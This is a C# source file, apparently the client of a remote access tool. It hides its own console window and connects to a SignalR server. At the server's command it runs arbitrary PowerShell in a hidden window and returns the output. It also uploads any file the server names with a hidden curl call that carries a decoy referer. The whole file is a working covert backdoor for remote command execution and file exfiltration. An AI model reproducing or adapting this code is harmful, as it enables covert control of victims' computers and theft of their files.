using Microsoft.AspNetCore.SignalR.Client;
using System.Diagnostics;

using Scalax_client.CONSTANTS;
using Scalax_client.CoreTasks;



// This block is to hide the app window in background (only windows since it imports methods from windows system dll lib files. (P/Invoke) )...
////
[System.Runtime.InteropServices.DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

[System.Runtime.InteropServices.DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

IntPtr handleConsoleWindow = GetConsoleWindow();

ShowWindow(handleConsoleWindow, 0);
////



HubConnection CHC = new HubConnectionBuilder()
    .WithUrl($"{CONSTANTS.SERVER_ENDPOINT_URL}/Hubs/communicate")
    .WithAutomaticReconnect()
    .Build()
    ;

CHC.StartAsync().Wait();


async Task RecordConnection()
{
    if (CHC is null) return;
    else Console.WriteLine("Client Connected...");

    await CHC.SendAsync("Init", Environment.UserName, CHC.ConnectionId, false);
}

RecordConnection().Wait();



CHC.On("ExecCmdOnOne", (string cmd) =>
{

    var cmdProc = new Process
    {
        StartInfo = new ProcessStartInfo
        {
            FileName = "powershell",
            WorkingDirectory = @"C:\",
            Arguments = $@"/C {cmd} > ""{CONSTANTS.tmpFilePath}"" & cls",
            WindowStyle = ProcessWindowStyle.Hidden,
            UseShellExecute = true,
            //Verb = "runas", //
        }
    };
    cmdProc.Start();


    var CLTknSrc = new CancellationTokenSource();
    CancellationToken CLTkn = CLTknSrc.Token;

    CoreTasks.CheckForCmdOuputThenFireEventToServer(
        cmdProc,
        CONSTANTS.tmpFilePath,
        null,
        null,
        CLTknSrc,
        CLTkn,
        (async () =>
        {
            await CHC.SendAsync("SendExecCmdOnOneRes", CHC.ConnectionId, File.ReadAllText(CONSTANTS.tmpFilePath));
        })
    ).Wait();

});


CHC.On("PullTheFile", (string fileData) =>
{

    string? fileType = fileData.Split('-')?[0];
    string? filePath = fileData.Split('-')?[1];
    string? fileTkn = fileData.Split('-')?[2];
    string? fileName = filePath?.Split(@"\")?.LastOrDefault()?.Split('.')?.FirstOrDefault();


    //// !!OBSOLETE!!
    //Console.WriteLine($"Encoding ${fileType}... at {filePath}");
    //byte[]? bytesArr = File.ReadAllBytes(filePath);
    //string fileAsStr = fileType.Equals("img") ? Convert.ToBase64String(bytesArr) : File.ReadAllText(filePath);
    //Console.WriteLine($"Encoded to {fileAsStr} \n\n or as byte[] : \n\n {bytesArr} [{bytesArr.Length}]");
    //CHC.SendAsync("SendPulledFileAsStr", bytesArr).Wait();
    //Console.WriteLine("DONE!..");
    ////


    Console.WriteLine($"Uploading the file at ({filePath})...");

    var cmdProc = new Process
    {
        StartInfo = new ProcessStartInfo
        {
            FileName = "cmd",
            WorkingDirectory = @"C:\",
            Arguments = $@"/C curl -e 'https://some-random-address.xyz/beta-{fileTkn}-0/{fileName}' {CONSTANTS.SERVER_ENDPOINT_URL}/fu -F f=@{filePath} & echo done > ""{Path.Combine(CONSTANTS.exeFilePath, "sentF.txt")}"" & cls",
            WindowStyle = ProcessWindowStyle.Hidden,
        }
    };
    cmdProc.Start();


    var CLTknSrc = new CancellationTokenSource();
    CancellationToken CLTkn = CLTknSrc.Token;

    CoreTasks.CheckForCmdOuputThenFireEventToServer (
        cmdProc,
        Path.Combine(CONSTANTS.exeFilePath, "sentF.txt"),
        byte.MaxValue * 25,
        TimeSpan.FromSeconds(1),
        CLTknSrc,
        CLTkn,
        (async () =>
        {
            await CHC.SendAsync("SendPulledFileAsDownloadUri", filePath);
        })
    ).Wait();

});



////
Thread.Sleep(-1);
////
